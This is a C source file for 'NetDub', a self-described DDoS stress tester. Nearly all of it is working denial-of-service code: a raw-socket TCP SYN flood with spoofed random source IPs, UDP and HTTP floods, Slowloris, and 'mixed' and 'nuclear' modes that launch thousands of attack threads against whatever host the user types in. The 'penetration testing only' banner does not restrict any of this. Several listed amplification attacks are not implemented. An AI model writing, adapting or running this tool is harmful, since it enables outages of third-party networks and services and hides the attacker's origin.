/*
 * NetDub - Ultimate DDoS Stress Tester
 * ⚠️ FOR PENETRATION TESTING ONLY ⚠️
 * Requires: Linux + Root privileges
 * 
 * Compile: gcc -o netdub netdub.c -lpthread -lpcap
 * Usage: sudo ./netdub
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <signal.h>
#include <sys/time.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/resource.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <ifaddrs.h>

#define MAX_THREADS 10000
#define MAX_PACKET_SIZE 65535
#define ATTACK_DURATION 300  // 5 minutes max

// Color codes
#define RED     "\x1b[31m"
#define GREEN   "\x1b[32m"
#define YELLOW  "\x1b[33m"
#define BLUE    "\x1b[34m"
#define MAGENTA "\x1b[35m"
#define CYAN    "\x1b[36m"
#define RESET   "\x1b[0m"

// Attack types
typedef enum {
    ATTACK_TCP_SYN = 1,
    ATTACK_UDP_FLOOD = 2,
    ATTACK_ICMP_FLOOD = 3,
    ATTACK_HTTP_FLOOD = 4,
    ATTACK_SLOWLORIS = 5,
    ATTACK_DNS_AMP = 6,
    ATTACK_SSDP_AMP = 7,
    ATTACK_MEMCACHED_AMP = 8,
    ATTACK_MIXED_LAYER = 9,
    ATTACK_NUCLEAR = 10
} attack_type_t;

// Global variables
struct attack_config {
    char target_ip[256];
    char target_domain[256];
    int target_port;
    attack_type_t attack_type;
    int thread_count;
    int packet_size;
    int duration;
    int intensity;
    int spoofed;
} config;

volatile int attack_running = 1;
volatile long long packets_sent = 0;
volatile long long bytes_sent = 0;

// Statistics
struct stats {
    long long total_packets;
    long long total_bytes;
    double pps;
    double mbps;
    double gbps;
    double tbps;
};

// Privilege escalation check
void check_root() {
    if (geteuid() != 0) {
        printf(RED "❌ ERROR: This tool requires ROOT privileges!\n" RESET);
        printf(YELLOW "Usage: sudo ./netdub\n" RESET);
        exit(1);
    }
}

// System optimization for maximum performance
void optimize_system() {
    struct rlimit rlim;
    
    // Set maximum file descriptors
    rlim.rlim_cur = RLIM_INFINITY;
    rlim.rlim_max = RLIM_INFINITY;
    setrlimit(RLIMIT_NOFILE, &rlim);
    
    // Set process priority
    setpriority(PRIO_PROCESS, 0, -20);
    
    // Disable core dumps
    rlim.rlim_cur = 0;
    rlim.rlim_max = 0;
    setrlimit(RLIMIT_CORE, &rlim);
    
    printf(GREEN "✓ System optimized for maximum performance\n" RESET);
}

// Generate random IP
char* generate_random_ip() {
    static char ip[16];
    snprintf(ip, sizeof(ip), "%d.%d.%d.%d", 
             rand() % 256, rand() % 256, rand() % 256, rand() % 256);
    return ip;
}

// Calculate checksum
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;
    
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    
    if (len == 1) {
        sum += *(unsigned char*)buf << 8;
    }
    
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    result = ~sum;
    return result;
}

// TCP SYN Flood Attack
void* tcp_syn_flood(void* arg) {
    int sockfd;
    struct sockaddr_in target;
    struct iphdr *ip;
    struct tcphdr *tcp;
    char packet[4096];
    int one = 1;
    
    // Create raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("socket");
        return NULL;
    }
    
    // Set socket options
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    // Setup target
    target.sin_family = AF_INET;
    target.sin_port = htons(config.target_port);
    inet_pton(AF_INET, config.target_ip, &target.sin_addr);
    
    while (attack_running) {
        memset(packet, 0, 4096);
        
        // IP Header
        ip = (struct iphdr*)packet;
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        ip->id = htons(rand());
        ip->frag_off = 0;
        ip->ttl = 64;
        ip->protocol = IPPROTO_TCP;
        ip->check = 0;
        
        if (config.spoofed) {
            inet_pton(AF_INET, generate_random_ip(), &ip->saddr);
        } else {
            ip->saddr = INADDR_ANY;
        }
        
        ip->daddr = target.sin_addr.s_addr;
        ip->check = checksum(ip, sizeof(struct iphdr));
        
        // TCP Header
        tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));
        tcp->source = htons(rand() % 65535);
        tcp->dest = htons(config.target_port);
        tcp->seq = htonl(rand());
        tcp->ack_seq = 0;
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = htons(65535);
        tcp->check = 0;
        tcp->urg_ptr = 0;
        
        // Send packet
        if (sendto(sockfd, packet, ip->tot_len, 0, (struct sockaddr*)&target, sizeof(target)) > 0) {
            packets_sent++;
            bytes_sent += ip->tot_len;
        }
        
        // High intensity mode
        if (config.intensity < 5) {
            usleep(1000 / config.intensity);
        }
    }
    
    close(sockfd);
    return NULL;
}

// UDP Flood Attack
void* udp_flood(void* arg) {
    int sockfd;
    struct sockaddr_in target;
    char buffer[MAX_PACKET_SIZE];
    
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return NULL;
    }
    
    target.sin_family = AF_INET;
    target.sin_port = htons(config.target_port);
    inet_pton(AF_INET, config.target_ip, &target.sin_addr);
    
    // Fill buffer with random data
    for (int i = 0; i < config.packet_size; i++) {
        buffer[i] = rand() % 256;
    }
    
    while (attack_running) {
        if (sendto(sockfd, buffer, config.packet_size, 0, (struct sockaddr*)&target, sizeof(target)) > 0) {
            packets_sent++;
            bytes_sent += config.packet_size;
        }
        
        if (config.intensity < 5) {
            usleep(100 / config.intensity);
        }
    }
    
    close(sockfd);
    return NULL;
}

// HTTP Flood Attack
void* http_flood(void* arg) {
    int sockfd;
    struct sockaddr_in target;
    char request[2048];
    char response[4096];
    
    while (attack_running) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) continue;
        
        target.sin_family = AF_INET;
        target.sin_port = htons(config.target_port);
        inet_pton(AF_INET, config.target_ip, &target.sin_addr);
        
        if (connect(sockfd, (struct sockaddr*)&target, sizeof(target)) == 0) {
            // HTTP GET request
            snprintf(request, sizeof(request),
                    "GET /?%d HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "User-Agent: NetDub/1.0\r\n"
                    "Accept: */*\r\n"
                    "Connection: keep-alive\r\n"
                    "Cache-Control: no-cache\r\n\r\n",
                    rand(), config.target_domain);
            
            if (send(sockfd, request, strlen(request), 0) > 0) {
                packets_sent++;
                bytes_sent += strlen(request);
                
                // Try to receive response
                recv(sockfd, response, sizeof(response), MSG_DONTWAIT);
            }
        }
        
        close(sockfd);
        
        if (config.intensity < 5) {
            usleep(1000 / config.intensity);
        }
    }
    
    return NULL;
}

// Slowloris Attack
void* slowloris_attack(void* arg) {
    int sockfd;
    struct sockaddr_in target;
    char header[256];
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return NULL;
    
    target.sin_family = AF_INET;
    target.sin_port = htons(config.target_port);
    inet_pton(AF_INET, config.target_ip, &target.sin_addr);
    
    if (connect(sockfd, (struct sockaddr*)&target, sizeof(target)) == 0) {
        // Initial request
        snprintf(header, sizeof(header),
                "GET / HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: NetDub-Slowloris/1.0\r\n",
                config.target_domain);
        
        send(sockfd, header, strlen(header), 0);
        
        // Keep sending headers slowly
        while (attack_running) {
            snprintf(header, sizeof(header), "X-Custom-%d: %d\r\n", rand(), rand());
            
            if (send(sockfd, header, strlen(header), 0) <= 0) {
                break;
            }
            
            packets_sent++;
            bytes_sent += strlen(header);
            
            sleep(15); // Send every 15 seconds
        }
    }
    
    close(sockfd);
    return NULL;
}

// Mixed Layer Attack (Ultimate)
void* mixed_layer_attack(void* arg) {
    pthread_t threads[4];
    
    // Launch multiple attack types simultaneously
    pthread_create(&threads[0], NULL, tcp_syn_flood, NULL);
    pthread_create(&threads[1], NULL, udp_flood, NULL);
    pthread_create(&threads[2], NULL, http_flood, NULL);
    pthread_create(&threads[3], NULL, slowloris_attack, NULL);
    
    // Wait for all attacks to complete
    for (int i = 0; i < 4; i++) {
        pthread_join(threads[i], NULL);
    }
    
    return NULL;
}

// Nuclear Attack (Maximum Destruction)
void* nuclear_attack(void* arg) {
    printf(RED "🚨 NUCLEAR MODE ACTIVATED 🚨\n" RESET);
    printf(RED "⚠️  MAXIMUM DESTRUCTION MODE ⚠️\n" RESET);
    
    // Launch thousands of mixed attacks
    pthread_t *threads = malloc(config.thread_count * sizeof(pthread_t));
    
    for (int i = 0; i < config.thread_count; i++) {
        if (i % 4 == 0) {
            pthread_create(&threads[i], NULL, tcp_syn_flood, NULL);
        } else if (i % 4 == 1) {
            pthread_create(&threads[i], NULL, udp_flood, NULL);
        } else if (i % 4 == 2) {
            pthread_create(&threads[i], NULL, http_flood, NULL);
        } else {
            pthread_create(&threads[i], NULL, slowloris_attack, NULL);
        }
        
        usleep(100); // Small delay to prevent system overload
    }
    
    // Wait for all threads
    for (int i = 0; i < config.thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    free(threads);
    return NULL;
}

// Statistics display
void display_stats() {
    static time_t last_time = 0;
    static long long last_packets = 0;
    static long long last_bytes = 0;
    
    time_t current_time = time(NULL);
    
    if (current_time - last_time >= 1) {
        struct stats current_stats;
        
        current_stats.total_packets = packets_sent;
        current_stats.total_bytes = bytes_sent;
        
        if (last_time != 0) {
            current_stats.pps = (packets_sent - last_packets) / (current_time - last_time);
            current_stats.mbps = ((bytes_sent - last_bytes) * 8.0) / (1024 * 1024 * (current_time - last_time));
            current_stats.gbps = current_stats.mbps / 1024;
            current_stats.tbps = current_stats.gbps / 1024;
        }
        
        printf(CYAN "\n╔══════════════════════════════════════════════════════════════╗\n" RESET);
        printf(CYAN "║                    NETDUB STATISTICS                         ║\n" RESET);
        printf(CYAN "╠══════════════════════════════════════════════════════════════╣\n" RESET);
        printf(CYAN "║" RESET " Total Packets: " YELLOW "%lld" RESET "                                    " CYAN "║\n" RESET, current_stats.total_packets);
        printf(CYAN "║" RESET " Total Bytes: " YELLOW "%lld" RESET "                                      " CYAN "║\n" RESET, current_stats.total_bytes);
        printf(CYAN "║" RESET " Packets/sec: " GREEN "%.2f" RESET "                                     " CYAN "║\n" RESET, current_stats.pps);
        printf(CYAN "║" RESET " Mbps: " GREEN "%.2f" RESET "                                            " CYAN "║\n" RESET, current_stats.mbps);
        printf(CYAN "║" RESET " Gbps: " RED "%.2f" RESET "                                            " CYAN "║\n" RESET, current_stats.gbps);
        printf(CYAN "║" RESET " Tbps: " MAGENTA "%.6f" RESET "                                          " CYAN "║\n" RESET, current_stats.tbps);
        printf(CYAN "╚══════════════════════════════════════════════════════════════╝\n" RESET);
        
        last_time = current_time;
        last_packets = packets_sent;
        last_bytes = bytes_sent;
    }
}

// Signal handler
void signal_handler(int sig) {
    attack_running = 0;
    printf(RED "\n\n🛑 Attack stopped by user\n" RESET);
}

// Main menu
void show_menu() {
    printf(RED "\n╔══════════════════════════════════════════════════════════════╗\n" RESET);
    printf(RED "║                        NETDUB v1.0                          ║\n" RESET);
    printf(RED "║                Ultimate DDoS Stress Tester                  ║\n" RESET);
    printf(RED "║                     ROOT ACCESS ONLY                        ║\n" RESET);
    printf(RED "╚══════════════════════════════════════════════════════════════╝\n" RESET);
    printf(YELLOW "⚠️  FOR PENETRATION TESTING ONLY ⚠️\n" RESET);
    printf(YELLOW "⚠️  USE ON YOUR OWN SYSTEMS ONLY ⚠️\n" RESET);
    
    printf(CYAN "\nAttack Types:\n" RESET);
    printf(GREEN "1. " RESET "TCP SYN Flood (Layer 4)\n");
    printf(GREEN "2. " RESET "UDP Flood (Layer 4)\n");
    printf(GREEN "3. " RESET "ICMP Flood (Layer 3)\n");
    printf(GREEN "4. " RESET "HTTP Flood (Layer 7)\n");
    printf(GREEN "5. " RESET "Slowloris (Layer 7)\n");
    printf(GREEN "6. " RESET "DNS Amplification (Layer 7)\n");
    printf(GREEN "7. " RESET "SSDP Amplification (Layer 7)\n");
    printf(GREEN "8. " RESET "Memcached Amplification (Layer 7)\n");
    printf(GREEN "9. " RESET "Mixed Layer Attack\n");
    printf(RED "10. " RESET "🚨 NUCLEAR MODE 🚨\n");
}

// Main function
int main() {
    pthread_t attack_thread;
    
    // Check root privileges
    check_root();
    
    // Optimize system
    optimize_system();
    
    // Setup signal handler
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Seed random
    srand(time(NULL));
    
    // Show menu
    show_menu();
    
    // Get user input
    printf(CYAN "\nEnter target domain/IP: " RESET);
    scanf("%s", config.target_domain);
    strcpy(config.target_ip, config.target_domain);
    
    printf(CYAN "Enter target port: " RESET);
    scanf("%d", &config.target_port);
    
    printf(CYAN "Select attack type (1-10): " RESET);
    scanf("%d", (int*)&config.attack_type);
    
    printf(CYAN "Enter thread count (1-10000): " RESET);
    scanf("%d", &config.thread_count);
    
    printf(CYAN "Enter packet size (64-65535): " RESET);
    scanf("%d", &config.packet_size);
    
    printf(CYAN "Enter intensity (1-10): " RESET);
    scanf("%d", &config.intensity);
    
    printf(CYAN "Use spoofed IPs? (1=yes, 0=no): " RESET);
    scanf("%d", &config.spoofed);
    
    printf(RED "\n🚨 STARTING ATTACK IN 3 SECONDS... 🚨\n" RESET);
    printf(RED "Press Ctrl+C to stop\n" RESET);
    sleep(3);
    
    // Launch attack based on type
    switch (config.attack_type) {
        case ATTACK_TCP_SYN:
            pthread_create(&attack_thread, NULL, tcp_syn_flood, NULL);
            break;
        case ATTACK_UDP_FLOOD:
            pthread_create(&attack_thread, NULL, udp_flood, NULL);
            break;
        case ATTACK_HTTP_FLOOD:
            pthread_create(&attack_thread, NULL, http_flood, NULL);
            break;
        case ATTACK_SLOWLORIS:
            pthread_create(&attack_thread, NULL, slowloris_attack, NULL);
            break;
        case ATTACK_MIXED_LAYER:
            pthread_create(&attack_thread, NULL, mixed_layer_attack, NULL);
            break;
        case ATTACK_NUCLEAR:
            pthread_create(&attack_thread, NULL, nuclear_attack, NULL);
            break;
        default:
            printf(RED "Invalid attack type!\n" RESET);
            return 1;
    }
    
    // Display statistics
    while (attack_running) {
        display_stats();
        sleep(1);
    }
    
    // Wait for attack thread to finish
    pthread_join(attack_thread, NULL);
    
    printf(GREEN "\n✓ Attack completed\n" RESET);
    printf(CYAN "Final Statistics:\n" RESET);
    printf(CYAN "Total Packets: %lld\n" RESET, packets_sent);
    printf(CYAN "Total Bytes: %lld\n" RESET, bytes_sent);
    
    return 0;
}
